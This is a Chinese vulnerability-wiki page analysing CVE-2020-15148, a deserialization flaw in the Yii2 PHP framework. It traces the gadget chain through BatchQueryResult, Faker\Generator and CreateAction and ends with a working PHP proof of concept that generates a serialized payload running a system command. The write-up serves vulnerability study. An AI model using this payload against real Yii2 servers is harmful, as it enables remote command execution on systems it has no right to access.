<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-15148）Yii2框架反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-15148\uff09Yii2\u6846\u67b6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" class="btn btn-xs btn-link">
        YouDianCMS 8.0 Storeage XSS
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Yearning/Yearningfront%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Yearning/Yearningfront%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Yearning front 接口存在任意文件读取漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-15148yii2">（CVE-2020-15148）Yii2框架反序列化漏洞<a class="headerlink" href="#cve-2020-15148yii2" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>如果在使用yii框架，并且在用户可以控制的输入处调用了unserialize()并允许特殊字符的情况下，会受到反序列化远程命令命令执行漏洞攻击。</p>
<p>该漏洞只是php
反序列化的执行链，必须要配合<code>unserialize</code>函数才可以达到任意代码执行的危害。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Yii2 \&lt;2.0.38</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>由于我本地的composer不知道为啥特别慢（换源也不管用），所以这里直接去<code>Yii2</code>的官方仓库里面拉。</p>
<p><img alt="1.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.jpg" /></p>
<p>选择一个漏洞影响的版本<code>yii-basic-app-2.0.37.tgz</code>解压到Web目录，然后修改一下配置文件。<code>/config/web.php</code>:</p>
<p><img alt="2.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.jpg" /></p>
<p>给<code>cookieValidationKey</code>字段设置一个值（如果是composer拉的可以跳过这一步）接着添加一个存在漏洞的<code>Action``/controllers/TestController.php</code>:</p>
<p><img alt="3.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.jpg" /></p>
<p>测试访问：</p>
<p><img alt="4.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.jpg" /></p>
<h3 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>由于没有漏洞细节，我们可以去<code>Yii2</code>的官方仓库看看提交记录。<a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?branch=9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99&amp;diff=split">yiisoft/yii2</a></p>
<p><img alt="5.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.jpg" /></p>
<p>在最新版中官方给<code>yii\db\BatchQueryResult</code>类加了一个<code>__wakeup()</code>函数，直接不允许反序列化这个类了。</p>
<p>所以这里猜测该类为反序列化起点。<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="k">namespace</span> <span class="nx">yii\db</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">BatchQueryResult</span><span class="p">{</span>
    <span class="sd">/** </span>
<span class="sd">    ......</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">reset</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">reset</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_dataReader</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_dataReader</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_dataReader</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_batch</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_value</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_key</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="sd">/** </span>
<span class="sd">    ......</span>
<span class="sd">    */</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>可以看到<code>__destruct()</code>调用了<code>reset()</code>方法<code>reset()</code>方法中，<code>$this-&gt;_dataReader</code>是可控的，所以此处可以当做跳板，去执行其他类中的<code>__call()</code>方法。</p>
<p>全局搜索<code>function __call(</code></p>
<p><img alt="6.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId32.jpg" /></p>
<p>其中找到一个<code>Faker\Generator</code>类<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">Generator</span><span class="p">{</span>
    <span class="sd">/** </span>
<span class="sd">    ......</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">format</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">,</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">),</span> <span class="nv">$arguments</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">providers</span> <span class="k">as</span> <span class="nv">$provider</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$provider</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$provider</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">);</span>

                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">\InvalidArgumentException</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;Unknown formatter &quot;%s&quot;&#39;</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="sd">/** </span>
<span class="sd">    ......</span>
<span class="sd">    */</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>可以看到，此处的<code>__call()</code>方法调用了<code>format()</code>，且<code>format()</code>从<code>$this-&gt;formatter</code>里面取出对应的值后，带入了<code>call_user_func_array()</code>函数中。由于<code>$this-&gt;formatter</code>是我们可控的，所以我们这里可以调用任意类中的任意方法了。但是<code>$arguments</code>是从<code>yii\db\BatchQueryResult::reset()</code>里传过来的，我们不可控，所以我们只能不带参数地去调用别的类中的方法。</p>
<p>到了这一步只需要找到一个执行类即可。我们可以全局搜索<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>，得到使用了<code>call_user_func</code>函数，且参数为类中成员变量的所有方法。</p>
<p><img alt="7.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.jpg" /></p>
<p>查看后发现<code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>这两个方法比较合适。这里拿<code>yii\rest\CreateAction::run()</code>举例<code>/vendor/yiisoft/yii2/rest/CreateAction.php</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">namespace</span><span class="w"> </span><span class="n">yii</span>\<span class="n">rest</span><span class="p">;</span>

<span class="k">class</span><span class="w"> </span><span class="n">CreateAction</span><span class="p">{</span>
<span class="w">    </span><span class="o">/**</span><span class="w"> </span>
<span class="w">    </span><span class="o">......</span>
<span class="w">    </span><span class="o">*/</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">run</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">checkAccess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">call_user_func</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">checkAccess</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="o">/*</span><span class="w"> </span><span class="err">@</span><span class="k">var</span><span class="w"> </span><span class="o">$</span><span class="n">model</span><span class="w"> </span>\<span class="n">yii</span>\<span class="n">db</span>\<span class="n">ActiveRecord</span><span class="w"> </span><span class="o">*/</span>
<span class="w">        </span><span class="o">$</span><span class="n">model</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">modelClass</span><span class="p">([</span>
<span class="w">            </span><span class="s1">&#39;scenario&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">scenario</span><span class="p">,</span>
<span class="w">        </span><span class="p">]);</span>

<span class="w">        </span><span class="o">$</span><span class="n">model</span><span class="o">-&gt;</span><span class="nb">load</span><span class="p">(</span><span class="n">Yii</span><span class="p">::</span><span class="o">$</span><span class="n">app</span><span class="o">-&gt;</span><span class="n">getRequest</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">getBodyParams</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">save</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Yii</span><span class="p">::</span><span class="o">$</span><span class="n">app</span><span class="o">-&gt;</span><span class="n">getResponse</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">setStatusCode</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span>
<span class="w">            </span><span class="o">$</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">array_values</span><span class="p">(</span><span class="o">$</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getPrimaryKey</span><span class="p">(</span><span class="bp">true</span><span class="p">)));</span>
<span class="w">            </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">getHeaders</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">Url</span><span class="p">::</span><span class="n">toRoute</span><span class="p">([</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">viewAction</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">id</span><span class="p">],</span><span class="w"> </span><span class="bp">true</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="w"> </span><span class="p">(</span><span class="o">!$</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">hasErrors</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ServerErrorHttpException</span><span class="p">(</span><span class="s1">&#39;Failed to create the object for unknown reason.&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">model</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="o">/**</span><span class="w"> </span>
<span class="w">    </span><span class="o">......</span>
<span class="w">    </span><span class="o">*/</span>
<span class="p">}</span>
<span class="err">?</span><span class="o">&gt;</span>
</code></pre></div>

<p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是我们可控的。所以整个利用链就出来了。</p>
<div class="codehilite"><pre><span></span><code><span class="n">yii</span><span class="err">\</span><span class="n">db</span><span class="err">\</span><span class="n">BatchQueryResult</span><span class="o">::</span><span class="n">__destruct</span><span class="p">()</span>
<span class="o">-&gt;</span>
<span class="n">Faker</span><span class="err">\</span><span class="n">Generator</span><span class="o">::</span><span class="n">__call</span><span class="p">()</span>
<span class="o">-&gt;</span>
<span class="n">yii</span><span class="err">\</span><span class="n">rest</span><span class="err">\</span><span class="n">CreateAction</span><span class="o">::</span><span class="n">run</span><span class="p">()</span>
</code></pre></div>

<p>还是挺简单的一个漏洞</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">namespace</span><span class="w"> </span><span class="n">yii</span>\<span class="n">rest</span><span class="p">{</span>
<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">CreateAction</span><span class="p">{</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="o">$</span><span class="n">checkAccess</span><span class="p">;</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="o">$</span><span class="n">id</span><span class="p">;</span>

<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">checkAccess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ls -al&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">Faker</span><span class="p">{</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">yii</span>\<span class="n">rest</span>\<span class="n">CreateAction</span><span class="p">;</span>

<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">Generator</span><span class="p">{</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">formatters</span><span class="p">;</span>

<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">formatters</span><span class="p">[</span><span class="s1">&#39;close&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">new</span><span class="w"> </span><span class="n">CreateAction</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;run&#39;</span><span class="p">];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">yii</span>\<span class="n">db</span><span class="p">{</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">Faker</span>\<span class="n">Generator</span><span class="p">;</span>

<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">BatchQueryResult</span><span class="p">{</span>
<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">_dataReader</span><span class="p">;</span>

<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_dataReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Generator</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="n">namespace</span><span class="p">{</span>
<span class="w">    </span><span class="n">echo</span><span class="w"> </span><span class="n">base64_encode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">yii</span>\<span class="n">db</span>\<span class="n">BatchQueryResult</span><span class="p">));</span>
<span class="p">}</span>
<span class="err">?</span><span class="o">&gt;</span>
</code></pre></div>

<p><img alt="8.jpg" src="../resource/%28CVE-2020-15148%29Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.jpg" /></p>
<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" class="btn btn-xs btn-link">
        YouDianCMS 8.0 Storeage XSS
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Yearning/Yearningfront%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Yearning/Yearningfront%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Yearning front 接口存在任意文件读取漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>